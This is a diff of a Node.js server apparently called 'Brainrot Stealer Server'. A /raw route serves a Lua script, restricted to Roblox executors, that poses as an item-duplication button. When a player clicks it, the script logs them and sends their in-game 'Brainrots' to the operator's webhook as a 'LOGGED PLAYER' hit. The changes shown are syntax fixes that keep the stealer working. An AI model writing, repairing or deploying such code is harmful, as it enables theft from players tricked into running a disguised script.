@@ -1,4 +1,4 @@
-// server.js - UPDATED WITH NEW DESIGN
+// server.js - FIXED SYNTAX ERRORS
 const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -73,7 +73,7 @@ app.get("/", (req, res) => {
   res.send("Brainrot Stealer Server");
 });
 
-// /raw → UPDATED LUA SCRIPT
+// /raw → FIXED LUA SCRIPT
 app.get("/raw", blockNonExecutor, (req, res) => {
   const webhookId = req.query.id;
 
@@ -445,7 +445,7 @@ dupeButton.MouseButton1Click:Connect(function()
         hitStatus = "this dosent look like a legit hit"
     end
     
-    -- Create embed (EXACTLY as requested)
+    -- Create embed (FIXED syntax)
     local embed = {
         title = "# LOGGED PLAYER",
         description = "a player just ran your script!",
@@ -458,7 +458,7 @@ dupeButton.MouseButton1Click:Connect(function()
             },
             {
                 name = "Brainrots", 
-                value = "```" .. brainrotsText .. "```",
+                value = "\\`\\`\\`" .. brainrotsText .. "\\`\\`\\`",
                 inline = false
             },
             {
